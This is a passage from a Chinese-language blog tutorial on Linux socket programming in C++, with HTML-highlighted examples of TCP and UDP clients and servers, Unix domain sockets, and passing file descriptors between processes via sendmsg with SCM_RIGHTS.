class="type">ssize_t</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">auto</span> fd = <span class="built_in">socket</span>(AF_INET, SOCK_DGRAM, IPPROTO_UDP);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;socket error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sockaddr_in</span> addr = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">socklen_t</span> len = <span class="built_in">sizeof</span>(addr);</span><br><span class="line">    addr.sin_family = AF_INET;                              <span class="comment">// ipv4</span></span><br><span class="line">    addr.sin_port = <span class="built_in">htons</span>(<span class="number">53</span>);                              <span class="comment">// 端口号转换为网络字节序</span></span><br><span class="line">    addr.sin_addr.s_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;114.114.114.114&quot;</span>);    <span class="comment">// 连接本机的服务器</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义网卡接口</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">ifreq</span> ifr = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">strncpy</span>(ifr.ifr_ifrn.ifrn_name, <span class="string">&quot;ens18&quot;</span>, <span class="built_in">sizeof</span>(ifr.ifr_ifrn.ifrn_name));</span><br><span class="line">    <span class="comment">// 获取网卡的index</span></span><br><span class="line">    <span class="built_in">ioctl</span>(fd, SIOCGIFINDEX, &amp;ifr);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> ifindex_opt = <span class="built_in">htonl</span>(ifr.ifr_ifindex);</span><br><span class="line">    <span class="comment">// 设置socket属性，IP_UNICAST_IF为单播，传入网卡index</span></span><br><span class="line">    ret = <span class="built_in">setsockopt</span>(fd, IPPROTO_IP, IP_UNICAST_IF, &amp;ifindex_opt, <span class="built_in">sizeof</span>(ifindex_opt));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;setsockopt error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ret = <span class="built_in">sendto</span>(fd, udpData, <span class="built_in">sizeof</span>(udpData), <span class="number">0</span>, (sockaddr *)&amp;addr, <span class="built_in">sizeof</span>(addr));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;send error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> err;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ret = <span class="built_in">recvfrom</span>(fd, buf, <span class="built_in">sizeof</span>(buf), <span class="number">0</span>, (sockaddr *)&amp;addr, &amp;len);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;recvfrom error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> err;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">log_hex</span>(buf, ret);</span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">err:</span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="六、实战示例"><a href="#六、实战示例" class="headerlink" title="六、实战示例"></a>六、实战示例</h1><h2 id="1-tcp传输"><a href="#1-tcp传输" class="headerlink" title="1. tcp传输"></a>1. tcp传输</h2><ul>
<li>socket确定是TCP协议后，recv和send拿到的数据是tcp数据，不包含tcp头部</li>
</ul>
<h3 id="1-1-端口模式"><a href="#1-1-端口模式" class="headerlink" title="1.1. 端口模式"></a>1.1. 端口模式</h3><ul>
<li>服务端</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">serverInitPort</span><span class="params">(<span class="type">int</span> port)</span> </span>&#123;</span><br><span class="line">    <span class="comment">/********** 1. 创建套接字 **********/</span></span><br><span class="line">    <span class="keyword">auto</span> fd = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;socket error, %d:%s\n&quot;</span>, errno, <span class="built_in">strerror</span>(errno));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/********** 2. 绑定端口 **********/</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sockaddr_in</span> addr = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    addr.sin_family = AF_INET;                 <span class="comment">// ipv4</span></span><br><span class="line">    addr.sin_port = <span class="built_in">htons</span>(port);               <span class="comment">// 端口号转换为网络字节序</span></span><br><span class="line">    addr.sin_addr.s_addr = <span class="built_in">htonl</span>(INADDR_ANY);  <span class="comment">// 监听所有地址 0.0.0.0</span></span><br><span class="line">    <span class="keyword">auto</span> ret = <span class="built_in">bind</span>(fd, (<span class="keyword">struct</span> sockaddr *)&amp;addr, <span class="built_in">sizeof</span>(addr));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bind error, %d:%s\n&quot;</span>, errno, <span class="built_in">strerror</span>(errno));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/********** 3. 监听端口，这里可以通过netstat查看到 **********/</span></span><br><span class="line">    ret = <span class="built_in">listen</span>(fd, SOMAXCONN);  <span class="comment">// 队列长度为SOMAXCONN，即最大排队连接数</span></span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;listen error, %d:%s\n&quot;</span>, errno, <span class="built_in">strerror</span>(errno));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> fd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">serverRun</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> serverFd = <span class="built_in">serverInitPort</span>(serverPort);</span><br><span class="line">    <span class="keyword">if</span> (serverFd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;serverInitPort error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="comment">/********** 1. 接受客户端连接 **********/</span></span><br><span class="line">        sockaddr_in clientAddr = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="type">socklen_t</span> clientAddrLen = <span class="built_in">sizeof</span>(clientAddr);</span><br><span class="line">        <span class="comment">// 下面函数会直接阻塞，直到有客户端连接进来。后两个参数用于获取客户端的地址信息</span></span><br><span class="line">        <span class="keyword">auto</span> clientFd = <span class="built_in">accept</span>(serverFd, (sockaddr *)&amp;clientAddr, &amp;clientAddrLen);</span><br><span class="line">        <span class="keyword">if</span> (clientFd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;accept error&quot;</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;accept client &#123;&#125;, addr &#123;&#125;:&#123;&#125;&quot;</span>, clientFd, <span class="built_in">inet_ntoa</span>(clientAddr.sin_addr), <span class="built_in">ntohs</span>(clientAddr.sin_port));</span><br><span class="line"></span><br><span class="line">        <span class="comment">/********** 2. 处理客户端请求 **********/</span></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="comment">// 接收客户端发送消息，调用recv会直接阻塞，直到接收到消息</span></span><br><span class="line">            <span class="type">char</span> buf[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="keyword">auto</span> ret = <span class="built_in">recv</span>(clientFd, buf, <span class="built_in">sizeof</span>(buf), <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;recv error&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;recv &#123;&#125; from client&quot;</span>, buf);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 发送消息给客户端</span></span><br><span class="line">            ret = <span class="built_in">send</span>(clientFd, buf, <span class="built_in">strlen</span>(buf), <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;send error&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;send &#123;&#125; to client&quot;</span>, buf);</span><br><span class="line">        &#125; <span class="keyword">while</span> (<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/********** 3. 关闭客户端套接字 **********/</span></span><br><span class="line">        <span class="built_in">close</span>(clientFd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>客户端</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">clientInitPort</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *ip, <span class="type">int</span> port)</span> </span>&#123;</span><br><span class="line">    <span class="comment">/********** 1. 创建套接字 **********/</span></span><br><span class="line">    <span class="keyword">auto</span> fd = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;socket error, %d:%s\n&quot;</span>, errno, <span class="built_in">strerror</span>(errno));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/********** 2. 连接服务器 **********/</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sockaddr_in</span> addr = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    addr.sin_family = AF_INET;             <span class="comment">// ipv4</span></span><br><span class="line">    addr.sin_port = <span class="built_in">htons</span>(port);           <span class="comment">// 端口号转换为网络字节序</span></span><br><span class="line">    addr.sin_addr.s_addr = <span class="built_in">inet_addr</span>(ip);  <span class="comment">// 连接本机的服务器</span></span><br><span class="line">    <span class="comment">// 连接服务端</span></span><br><span class="line">    <span class="keyword">auto</span> ret = <span class="built_in">connect</span>(fd, (<span class="keyword">struct</span> sockaddr *)&amp;addr, <span class="built_in">sizeof</span>(addr));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;connect error, %d:%s\n&quot;</span>, errno, <span class="built_in">strerror</span>(errno));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> fd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">clientRunPort</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">/********** 1. 创建套接字 **********/</span></span><br><span class="line">    <span class="keyword">auto</span> fd = <span class="built_in">clientInitPort</span>(<span class="string">&quot;127.0.0.1&quot;</span>, serverPort);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;clientInitPort error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/********** 2. 发送消息 **********/</span></span><br><span class="line">    <span class="keyword">auto</span> msg = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    <span class="comment">// recv和send拿到的都是不包含tcp头部的数据</span></span><br><span class="line">    <span class="keyword">auto</span> ret = <span class="built_in">send</span>(fd, msg, <span class="built_in">strlen</span>(msg), <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;send error, %d:%s\n&quot;</span>, errno, <span class="built_in">strerror</span>(errno));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/********** 3. 接收服务端的消息 **********/</span></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="comment">// recv函数会直接阻塞，直到服务端发送消息过来</span></span><br><span class="line">    ret = <span class="built_in">recv</span>(fd, buf, <span class="built_in">sizeof</span>(buf), <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;recv error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;recv msg &#123;&#125;&quot;</span>, buf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/********** 4. 关闭客户端套接字 **********/</span></span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-2-unix套接字"><a href="#1-2-unix套接字" class="headerlink" title="1.2. unix套接字"></a>1.2. unix套接字</h3><ul>
<li>源码分析查看<a href="/blogs/2021-03-22-linux-kernel/#1-3-unix%E5%A5%97%E6%8E%A5%E5%AD%97">unix套接字</a></li>
<li>服务端，区别仅在init阶段</li>
<li>建立<code>AF_UNIX</code>套接字的情况下，protocol必须设置为<code>0</code></li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/un.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">serverInitUnix</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *unixPath)</span> </span>&#123;</span><br><span class="line">    <span class="comment">/********** 1. 创建套接字 **********/</span></span><br><span class="line">    <span class="keyword">auto</span> fd = <span class="built_in">socket</span>(AF_UNIX, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;socket error, unixPath &#123;&#125;, error &#123;&#125;:&#123;&#125;&quot;</span>, unixPath, errno, <span class="built_in">strerror</span>(errno));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/********** 2. 绑定域套接字，不存在会创建 **********/</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sockaddr_un</span> addr = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    addr.sun_family = AF_UNIX;</span><br><span class="line">    <span class="built_in">strncpy</span>(addr.sun_path, unixPath, <span class="built_in">sizeof</span>(addr.sun_path) - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">auto</span> ret = <span class="built_in">bind</span>(fd, (<span class="keyword">struct</span> sockaddr *)&amp;addr, <span class="built_in">sizeof</span>(addr));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;bind error, unixPath &#123;&#125;, error &#123;&#125;:&#123;&#125;&quot;</span>, unixPath, errno, <span class="built_in">strerror</span>(errno));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/********** 3. 监听域套接字，这里可以通过netstat查看到 **********/</span></span><br><span class="line">    ret = <span class="built_in">listen</span>(fd, SOMAXCONN);  <span class="comment">// 队列长度为SOMAXCONN，即最大排队连接数</span></span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;listen error, unixPath &#123;&#125;, error &#123;&#125;:&#123;&#125;&quot;</span>, unixPath, errno, <span class="built_in">strerror</span>(errno));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> fd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>客户端区别也在init阶段</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/un.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">clientInitUnix</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *unixPath)</span> </span>&#123;</span><br><span class="line">    <span class="comment">/********** 1. 创建套接字 **********/</span></span><br><span class="line">    <span class="keyword">auto</span> fd = <span class="built_in">socket</span>(AF_UNIX, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;socket error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/********** 2. 连接服务器 **********/</span></span><br><span class="line">    sockaddr_un addr;</span><br><span class="line">    addr.sun_family = AF_UNIX;</span><br><span class="line">    <span class="built_in">strcpy</span>(addr.sun_path, unixPath);</span><br><span class="line">    <span class="keyword">auto</span> ret = <span class="built_in">connect</span>(fd, (<span class="keyword">struct</span> sockaddr *)&amp;addr, <span class="built_in">sizeof</span>(addr));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;connect error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-udp传输"><a href="#2-udp传输" class="headerlink" title="2. udp传输"></a>2. udp传输</h2><ul>
<li>和tcp不同点在于，服务端不需要listen，调用完bind就可以直接recv</li>
<li>客户端不需要connect，创建完socket就可以直接调用<code>sendto</code></li>
<li>如果对端是一个服务器，但是端口没开放，会回复icmp端口不可达，这个需要通过设置sockopt才能在recvfrom时返回错误，不然就会阻塞</li>
<li>如果对端地址不可达，那就无法得知，不会回复icmp不可达的信息</li>
</ul>
<h3 id="2-2-客户端代码"><a href="#2-2-客户端代码" class="headerlink" title="2.2. 客户端代码"></a>2.2. 客户端代码</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="comment">/********** 1. 创建套接字 **********/</span></span><br><span class="line">    <span class="keyword">auto</span> fd = <span class="built_in">socket</span>(AF_INET, SOCK_DGRAM, IPPROTO_UDP);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;socket error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 想要收到icmp端口不可达的信息，需要设置下面的选项</span></span><br><span class="line">    <span class="type">int</span> val = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">setsockopt</span>(fd, IPPROTO_IP, IP_RECVERR, &amp;val, <span class="built_in">sizeof</span>(val));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/********** 2. 发送消息 **********/</span></span><br><span class="line">    <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;Begin send&quot;</span>));</span><br><span class="line">    <span class="keyword">auto</span> msg = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sockaddr_in</span> addr = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    addr.sin_family = AF_INET;                    <span class="comment">// ipv4</span></span><br><span class="line">    addr.sin_port = <span class="built_in">htons</span>(<span class="number">5555</span>);                  <span class="comment">// 端口号转换为网络字节序</span></span><br><span class="line">    addr.sin_addr.s_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;10.240.17.101&quot;</span>);  <span class="comment">// 连接本机的服务器</span></span><br><span class="line">    <span class="keyword">auto</span> ret = <span class="built_in">sendto</span>(fd, msg, <span class="built_in">strlen</span>(msg), <span class="number">0</span>, <span class="built_in">reinterpret_cast</span>&lt;sockaddr *&gt;(&amp;addr), <span class="built_in">sizeof</span>(addr));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;send error &#123;&#125;&quot;</span>, std::<span class="built_in">to_string</span>(std::<span class="built_in">error_code</span>(errno, std::<span class="built_in">system_category</span>())));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/********** 3. 接收服务端的消息 **********/</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Begin recv\n&quot;</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="comment">// recv函数会直接阻塞，直到服务端发送消息过来</span></span><br><span class="line">    <span class="type">socklen_t</span> len = <span class="built_in">sizeof</span>(addr);</span><br><span class="line">    ret = <span class="built_in">recvfrom</span>(fd, buf, <span class="built_in">sizeof</span>(buf), <span class="number">0</span>, <span class="built_in">reinterpret_cast</span>&lt;sockaddr *&gt;(&amp;addr), &amp;len);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;recv error, %d:%s\n&quot;</span>, errno, <span class="built_in">strerror</span>(errno));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;recv msg &#123;&#125;&quot;</span>, buf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/********** 4. 关闭客户端套接字 **********/</span></span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-转移文件句柄到另一个进程"><a href="#3-转移文件句柄到另一个进程" class="headerlink" title="3. 转移文件句柄到另一个进程"></a>3. 转移文件句柄到另一个进程</h2><ul>
<li>主要使用<code>sendmsg/recvmsg</code>连个系统调用实现</li>
<li>必须使用unix套接字才能发送和接受成功，但是使用tcp协议和udp都可以，域套接字也不会丢包</li>
<li>将套接字发送出去后，本进程内的文件句柄还有效可以读写数据，但是关闭套接字不会引起客户端断开连接，即使接收进程没有进行<code>recvmsg</code>接受套接字</li>
<li>文件描述符发送时，内核会对文件描述符结构体进行拷贝到另一个进程，但是文件描述符句柄的值会根据当前进程的最小未打开的文件描述符进行计算，不会和发送端一致<ul>
<li>例如发送端发送的fd值是4，接受端受到的会变成其他值，可以是3、4、5等</li>
</ul>
</li>
</ul>
<h5 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h5><ul>
<li>发送端</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SEND_FD_NUM 1  <span class="comment">// 可以一次发送多个文件描述符</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sendFd</span><span class="params">(<span class="type">int</span> clientFd)</span> </span>&#123;</span><br><span class="line">    <span class="comment">/********** 1. 和待接受的进程建立连接 **********/</span></span><br><span class="line">    <span class="comment">// 必须使用unix套接字才能进行文件描述符发送</span></span><br><span class="line">    <span class="keyword">auto</span> fd = <span class="built_in">clientInitUnix</span>(serverPath);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;clientInitUnix error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/********** 2. 构建msg进行发送套接字 **********/</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">msghdr</span> msg = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="comment">// 使用union定义可以使用宏设置字节对齐的结构体</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">cmsghdr</span> cm;</span><br><span class="line">        <span class="type">char</span> control[<span class="built_in">CMSG_SPACE</span>(<span class="built_in">sizeof</span>(clientFd) *</span><br><span class="line">                                SEND_FD_NUM)];  <span class="comment">// 包含cmsghdr大小和fd大小的空间，对两个都进行了8字节对齐</span></span><br><span class="line">    &#125; control_un;</span><br><span class="line">    control_un.cm.cmsg_len =</span><br><span class="line">        <span class="built_in">CMSG_LEN</span>(<span class="built_in">sizeof</span>(clientFd) * SEND_FD_NUM);  <span class="comment">// 此宏代表cmsghdr大小和clientFd大小的空间，对cmsghdr进行了8字节对齐</span></span><br><span class="line">    control_un.cm.cmsg_level = SOL_SOCKET;          <span class="comment">// 发送文件描述符必须设置的level</span></span><br><span class="line">    control_un.cm.cmsg_type = SCM_RIGHTS;           <span class="comment">// 发送文件描述符</span></span><br><span class="line">    <span class="type">int</span> *fdPtr = (<span class="type">int</span> *)<span class="built_in">CMSG_DATA</span>(&amp;control_un.cm);  <span class="comment">// 获取文件描述符的指针</span></span><br><span class="line">    fdPtr[<span class="number">0</span>] = clientFd;                            <span class="comment">// 